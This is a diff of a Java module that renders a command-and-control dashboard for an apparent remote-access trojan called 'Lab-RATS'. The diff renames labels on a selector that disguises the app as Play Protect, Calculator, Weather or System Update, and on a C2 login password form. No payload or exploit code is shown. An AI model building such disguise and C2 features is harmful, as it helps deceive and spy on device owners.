@@ -178,9 +178,9 @@ public class TerminalModule extends BaseModule {
         html.append("<label class=\"info-label\" style=\"align-self: flex-start; font-size: 0.7rem;\">MASQUERADE_IDENTITY:</label>");
         html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
         html.append("<option value=\"settings\">Play Protect (Google Shield)</option>");
-        html.append("<option value=\"calc\">Calculator (Apple Style)</option>");
-        html.append("<option value=\"weather\">Weather (Blue Sky Forecast)</option>");
-        html.append("<option value=\"update\">System Update (System Config)</option>");
+        html.append("<option value=\"calc\">Calculator</option>");
+        html.append("<option value=\"weather\">Weather</option>");
+        html.append("<option value=\"update\">System Update</option>");
         html.append("<option value=\"logo\">Lab-RATS Logo (Unmasked)</option>");
         html.append("</select>");
         html.append("</div>");
@@ -193,12 +193,12 @@ public class TerminalModule extends BaseModule {
 
         // --- CHANGE ACCESS KEY SECTION ---
         html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
-        html.append("<h2 style=\"color: var(--neon-cyan); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">SECURITY_PROTOCOL <span class=\"info-trigger\" onclick=\"showInfo(event, 'SECURITY_PROTOCOL', 'Update login password for the remote C2 interface.')\">INFO</span></h2>");
+        html.append("<h2 style=\"color: var(--neon-cyan); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">SECURE_LOGIN <span class=\"info-trigger\" onclick=\"showInfo(event, 'SECURE_LOGIN', 'Update login password for the remote C2 Dashboard.')\">INFO</span></h2>");
         html.append("<div style=\"display: flex; flex-direction: column; align-items: flex-start;\">");
         html.append("<div style=\"width: 100%; max-width: 660px;\">");
         html.append("<form action=\"/settings/password\" method=\"POST\" class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 10px;\">");
-        html.append("<input name=\"new_password\" type=\"password\" placeholder=\"ENTER_NEW_KEY\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
-        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 10px; font-size: 0.7rem; width: 210px !important; text-align: center; margin: 0;\">UPDATE_KEY</button>");
+        html.append("<input name=\"new_password\" type=\"password\" placeholder=\"ENTER NEW PASSWORD\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
+        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 10px; font-size: 0.7rem; width: 210px !important; text-align: center; margin: 0;\">UPDATE_PASSWORD</button>");
         html.append("</form></div></div></div>");
 
         // --- DANGER ZONE SECTION ---
